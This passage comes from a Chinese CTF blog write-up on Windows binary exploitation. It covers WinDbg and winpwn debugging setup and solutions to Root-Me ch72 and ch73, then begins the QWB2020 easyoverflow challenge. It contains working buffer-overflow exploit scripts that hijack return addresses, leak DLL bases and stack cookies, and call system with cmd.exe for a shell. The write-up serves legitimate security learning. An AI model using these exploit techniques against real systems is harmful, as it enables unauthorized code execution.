process(file_name)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment"># r.sendline(&#x27;C:\\Windows\\system32\\cmd.exe&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="windbg-调试"><a href="#windbg-调试" class="headerlink" title="windbg 调试"></a>windbg 调试</h2><p>通过 pause 将程序断住，然后在 windbg 里面 attach 进程就好了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-53-55.png"
+                      alt="nipaste_2024-05-14_13-53-5"
+                ></p>
+<p>可以看到程序已经可以成功断住</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-55-17.png"
+                      alt="nipaste_2024-05-14_13-55-1"
+                ></p>
+<p>执行下面两个指令，就可以在断点处停下来了，记得这时候</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-54-36.png"
+                      alt="nipaste_2024-05-14_13-54-3"
+                ></p>
+<p>查看返回地址可以发现已经被我们覆盖为了后门函数的地址，运行即可 getshell。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_13-59-03.png"
+                      alt="nipaste_2024-05-14_13-59-0"
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ch72.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">pause()			<span class="comment"># 将程序卡在这里</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment"># r.sendline(&#x27;C:\\Windows\\system32\\cmd.exe&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="利用winpwn模块进行调试"><a href="#利用winpwn模块进行调试" class="headerlink" title="利用winpwn模块进行调试"></a>利用winpwn模块进行调试</h2><p>命令如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windbgx.attach(io, &#x27;bp 0x14000109B&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>利用 winpwn 模块进行调试时，需要在该目录下面添加一个 .winpwn 配置文件。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_10-25-48.png"
+                      alt="nipaste_2024-05-15_10-25-4"
+                ></p>
+<p>文件内容如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;debugger&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;i386&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;x64dbg&quot;</span>: <span class="string">&quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe&quot;</span>, </span><br><span class="line">            <span class="string">&quot;gdb&quot;</span>: <span class="string">&quot;F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe&quot;</span>, </span><br><span class="line">            <span class="string">&quot;windbg&quot;</span>: <span class="string">&quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;windbgx&quot;</span>: <span class="string">&quot;C:\\Users\\henry\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;amd64&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;x64dbg&quot;</span>: <span class="string">&quot;F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe&quot;</span>, </span><br><span class="line">            <span class="string">&quot;gdb&quot;</span>: <span class="string">&quot;F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe&quot;</span>, </span><br><span class="line">            <span class="string">&quot;windbg&quot;</span>: <span class="string">&quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;windbgx&quot;</span>: <span class="string">&quot;C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;debugger_init&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;i386&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;x64dbg&quot;</span>: <span class="string">&quot;&quot;</span>, </span><br><span class="line">            <span class="string">&quot;gdb&quot;</span>: <span class="string">&quot;&quot;</span>, </span><br><span class="line">            <span class="string">&quot;windbg&quot;</span>: <span class="string">&quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;windbgx&quot;</span>: <span class="string">&quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;amd64&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;x64dbg&quot;</span>: <span class="string">&quot;&quot;</span>, </span><br><span class="line">            <span class="string">&quot;gdb&quot;</span>: <span class="string">&quot;&quot;</span>, </span><br><span class="line">            <span class="string">&quot;windbg&quot;</span>: <span class="string">&quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;windbgx&quot;</span>: <span class="string">&quot;.load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>根据自己的需求改就行了，比如说我这里想调用 windbgX，只需要把 windbgx 的路径写到第 7 行就行。</p>
+<h2 id="windbg-带符号调试"><a href="#windbg-带符号调试" class="headerlink" title="windbg 带符号调试"></a>windbg 带符号调试</h2><blockquote>
+<p>source：<a class="link"   target="_blank" rel="noopener" href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/" >https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>这里建议配置一下调试符号表的下载，由于现在墙的限制和<code>windows</code>对很多符号表已经取消开放了，所以很多系统库文件已经没有符号表了。但是对已有的，加载了符号表后，调试还是很方便的。符号表配置方法如下：</p>
+<p>首先在<code>windbg</code>的<code>symbol file path</code>中添加符号表本地缓存的路径和远程的符号服务器：</p>
+<p><code>srv*c:\MySymbols*https://msdl.microsoft.com/download/symbols</code></p>
+<p>随后在<code>windbg</code>命令行中输入：<code>.reload</code>即可重新加载符号文件（**注意:**这里由于墙的原因，所以需要梯子）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.sympath   // 查看当前符号查找路径</span><br><span class="line">.sympath c:\symbols   // 将符号查找路径设为：c:\symbols</span><br><span class="line">.sympath+ c:\symbols  // 将c:\symbols添加到符号查找路径集合中</span><br><span class="line"></span><br><span class="line">.reload // 为所有已加载模块载入符号信息</span><br><span class="line">.reload /f /v // f:强制立即模式（不允许延迟载入）  v:详细模式</span><br><span class="line">.reload /f @&quot;c:\windows\System32\verifier.dll&quot; // 为指定模块加载符号信息</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="ret2dll"><a href="#ret2dll" class="headerlink" title="ret2dll"></a>ret2dll</h3><p><a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer" >进程资源管理器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具查看程序加载的dll有哪些，这里我们对上一题 ch72 的依赖进行查看，如下图所示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_14-08-28.png"
+                      alt="nipaste_2024-05-14_14-08-2"
+                ></p>
+<h3 id="常见-dll"><a href="#常见-dll" class="headerlink" title="常见 dll"></a>常见 dll</h3><p>常见的 dll 有：<code>ntdll.dll</code>, <code>kernel32.dll</code>, <code>KernelBase.dll</code>, <code>ucrtbase.dll</code></p>
+<ul>
+<li><strong>ntdll.dll</strong>：ntdll.dll是<strong>重要的Windows NT内核级文件</strong>。描述了windows本地NTAPI的接口。当Windows<strong>启动时</strong>，ntdll.dll就<strong>驻留在内存中特定的写保护区域</strong>，使别的程序<strong>无法占用</strong>这个内存区域。是Windows系统从<strong>ring3 到 ring0 的入口</strong>，位于Kernel32.dll和user32.dll中的所有win32 API <strong>最终都是调用ntdll.dll中的函数实现的</strong>。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中</li>
+<li><strong>kernel32.dll</strong>：kernel32.dll是非常重要的<strong>32位动态链接库文件，属于内核级文件</strong>。它控制着系统的<strong>内存管理、数据的输入输出操作和中断处理</strong>，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</li>
+<li><strong>KernelBase.dll</strong>：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要</li>
+<li><strong>ucrtbase.dll</strong>：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中<strong>提供了printf,malloc,strcpy等C语言库函数的具体运行实现</strong>，这个和libc.so很像。ucrtbase.dll其实就是把<code>msvcrt.dll</code>拆开了，主要的c运行时的代码放在了<code>ucrtbase.dll</code>中</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_14-43-05.png"
+                      alt="nipaste_2024-05-14_14-43-0"
+                ></p>
+<p><strong>题目下载</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2225 app-systeme-ch73@challenge05.root-me.org:/challenge/app-systeme/ch73/ch73.exe /home/henry/Documents</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_15-14-51.png"
+                      alt="nipaste_2024-05-14_15-14-5"
+                ></p>
+<p><strong>静态分析</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_17-46-51.png"
+                      alt="nipaste_2024-05-14_17-46-5"
+                ></p>
+<p>调试带参数的程序设置如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_17-43-30.png"
+                      alt="nipaste_2024-05-14_17-43-3"
+                ></p>
+<p>不知道为什么一开始还行，但是后面就只能设置绝对路径才能打开成功。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_21-44-57.png"
+                      alt="nipaste_2024-05-14_21-44-5"
+                ></p>
+<p><strong>动态分析</strong></p>
+<p><strong>step.1 泄露出 file pointer 值</strong></p>
+<p>这个值也就是上面静态分析中的 v11 存储的值，如果我们直接覆盖，会导致后面 close 崩溃。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_21-50-52.png"
+                      alt="nipaste_2024-05-14_21-50-5"
+                ></p>
+<p>经过测试，这个值在程序每次启动后的值都是一样的，只有当机器关了重启之后，该值会被重置。</p>
+<p><strong>step.2 泄露出 dll_base</strong></p>
+<p>这个值可以理解为是 libc_base，与在 linux 中一样，我们可以通过 printf，puts 这种函数来进行泄露地址。在 win 中是没有 plt 和 got 表的，但是 PE 中有两个差不多和这个等价的。</p>
+<p>下图 idata 节处存储的即为对应函数的 dll 中的地址，只有当执行时，对应的地址将会写在这里（直接理解为 got 表就完事了）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_21-53-49.png"
+                      alt="nipaste_2024-05-14_21-53-4"
+                ></p>
+<p>这里不多说，相应的类似于 plt 表的功能。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_21-56-22.png"
+                      alt="nipaste_2024-05-14_21-56-2"
+                ></p>
+<p>通过下面的 payload 我们就可以完成泄露地址信息</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(0xdeadbeef) + p32(printf_plt) + p32(0xdeadbeef) + p32(printf_got)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_20-20-31.png"
+                      alt="nipaste_2024-05-14_20-20-3"
+                ></p>
+<p><strong>step.3 计算出 system，cmd.exe，劫持执行流</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf_addr = <span class="number">0x756f4cb0</span></span><br><span class="line">dll_base = printf_addr - <span class="number">0x10174CB0</span></span><br><span class="line">_system = dll_base + <span class="number">0x10143D30</span></span><br><span class="line">cmd_addr = dll_base + <span class="number">0x101047A4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2008</span></span><br><span class="line">payload += p32(file_pointer) <span class="comment"># file_pointer</span></span><br><span class="line">payload += p32(<span class="number">0x4016f1</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0x28</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(_system) + p32(<span class="number">0xdeadbeef</span>) + p32(cmd_addr)</span><br></pre></td></tr></table></figure></div>
+
+<p>这里说一句，这里的 printf_addr 的值和前面 file pointer 类似，只有机器重启，才会重置该值。</p>
+<p><strong>注意事项：</strong></p>
+<p>除了 processexplorer 可以查程序的依赖库外，windbg 在开始加载程序时，也会输出依赖库信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_22-01-19.png"
+                      alt="nipaste_2024-05-14_22-01-1"
+                ></p>
+<p>这里的 <code>msvcrt.dll</code> 与 <code>libc.so.6</code> 类似，我们需要在这个库里面找到对应的偏移，我们上面的 dll_base，实际上就是 <code>msvcrt.dll</code> 在内存中加载的基地址。</p>
+<p>最后也可以看到，也是在本地成功打通了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-14_22-03-08.png"
+                      alt="nipaste_2024-05-14_22-03-0"
+                ></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./ch73.exe&#x27;</span></span><br><span class="line"><span class="comment"># r = remote()</span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line">file_pointer = <span class="number">0x75734660</span></span><br><span class="line">printf_plt = <span class="number">0x00402974</span></span><br><span class="line">printf_got = <span class="number">0x00406200</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2008</span></span><br><span class="line">payload += p32(file_pointer) <span class="comment"># file_pointer</span></span><br><span class="line">payload += p32(<span class="number">0x4016f1</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0x28</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(printf_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = [ord(i) for i in payload]</span></span><br><span class="line"><span class="comment"># with open(&#x27;./test.txt&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(bytes(payload))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------Second P2------------------</span></span><br><span class="line">printf_addr = <span class="number">0x756f4cb0</span></span><br><span class="line">dll_base = printf_addr - <span class="number">0x10174CB0</span></span><br><span class="line">_system = dll_base + <span class="number">0x10143D30</span></span><br><span class="line">cmd_addr = dll_base + <span class="number">0x101047A4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2008</span></span><br><span class="line">payload += p32(file_pointer) <span class="comment"># file_pointer</span></span><br><span class="line">payload += p32(<span class="number">0x4016f1</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0x28</span>) <span class="comment"># same as program</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(_system) + p32(<span class="number">0xdeadbeef</span>) + p32(cmd_addr)</span><br><span class="line"></span><br><span class="line">payload = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> payload]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./test.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([file_name, &#x27;./test.txt&#x27;])</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp 0x0401762&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+<h2 id="win传参寄存器"><a href="#win传参寄存器" class="headerlink" title="win传参寄存器"></a>win传参寄存器</h2><p>参数先通过寄存器传递，顺序是 <code>rcx rdx r8 r9</code></p>
+<h2 id="显示加载的各模块地址（vmmap）"><a href="#显示加载的各模块地址（vmmap）" class="headerlink" title="显示加载的各模块地址（vmmap）"></a>显示加载的各模块地址（vmmap）</h2><p>lwt 指令</p>
+<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><h3 id="qwb2020-easyoverflow"><a href="#qwb2020-easyoverflow" class="headerlink" title="qwb2020-easyoverflow"></a>qwb2020-easyoverflow</h3><p>题目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip" >easyoverflow <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>虽然是一道很明显的栈溢出题目，但我在利用的过程中还是感受到了 win 和在 linux 中的不同，win 中保护变得貌似更复杂了点（略微复杂）。</p>
+<p>先来看最后效果图，这是本地打通后的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_16-39-31.png"
+                      alt="nipaste_2024-05-15_16-39-3"
+                ></p>
+<p>远程用 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server" >Win Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 映射端口后，我用 ubuntu 远程打了一下，效果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_16-45-12.png"
+                      alt="nipaste_2024-05-15_16-45-1"
+                ></p>
+<p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_16-46-43.png"
+                      alt="nipaste_2024-05-15_16-46-4"
+                ></p>
+<p>可以看到 NX，canary，aslr，SEH 这些保护都是开了的。</p>
+<p><strong>静态分析</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_16-48-32.png"
+                      alt="nipaste_2024-05-15_16-48-3"
+                ></p>
+<p>可以很明显的看到这里存在溢出，接下来考虑怎么利用了，我们不妨从 linux 的角度先来分析如何利用：</p>
+<ul>
+<li>首先我们会通过 <strong>puts 泄露 canary</strong></li>
+<li>由于有三次 puts 的机会，我们还可以将 DstBuf 填充到返回地址前将<strong>泄露程序地址</strong></li>
+<li>有了程序地址后，我们就可以劫持执行流，<strong>puts 出 got 表中的 libc 地址</strong>，在返回到 main 函数</li>
+<li>计算出 system，bin_sh <strong>拿 shell</strong></li>
+</ul>
+<p>实际上就是一套标准的 ret2libc 的打法，那我们再来看看 win 下我们的利用过程：</p>
+<ul>
+<li>首先我们会通过 <strong>puts 泄露 canary</strong></li>
+<li>由于有三次 puts 的机会，我们还可以将 DstBuf 填充到返回地址前将<strong>泄露程序地址</strong></li>
+<li><strong>泄露出 ntdll.dll 的地址</strong>，来<strong>获取 gadget 地址</strong>，该地址<strong>在栈中</strong>，所以可以进行填充泄露</li>
+<li><strong>泄露出 security_cookie 的值</strong>，win 中 <code>canary = rsp ^ security_cookie </code></li>
+<li>puts 出 idata 表中存放的 <strong>ucrtbase 地址</strong>，在返回到 main 函数</li>
+<li>计算出 system，cmd_addr <strong>拿 shell</strong></li>
+</ul>
+<p>通过上面的分析我们可以发现，两者之间的区别是在第三步和第四步，但整体的思路仍然是相同的，下面我们就动态调试进一步详细说明。</p>
+<p><strong>动态分析</strong></p>
+<p>这里先说一下开了 aslr 的程序怎么用 windbg 进行调试，我们下断点的时候，可以通过一个程序名+偏移的方式下断点。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp StackOverflow+0x1000</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-07-40.png"
+                      alt="nipaste_2024-05-15_17-07-4"
+                ></p>
+<p><strong>step.1 leak stack_cookie</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-12-26.png"
+                      alt="nipaste_2024-05-15_17-12-2"
+                ></p>
+<p>通过上面我们可以计算出 DstBuf 和 stack_cookie（rsp ^ security_book） 之间的偏移，118h - 18h &#x3D; 100h。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-14-40.png"
+                      alt="nipaste_2024-05-15_17-14-4"
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>step.2 leak code_base</strong></p>
+<p>其实从上面那里还可以看到程序的返回地址就在离 stack_cookie 不远处，所以我们这一步在泄露出返回地址。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-16-20.png"
+                      alt="nipaste_2024-05-15_17-16-2"
+                ></p>
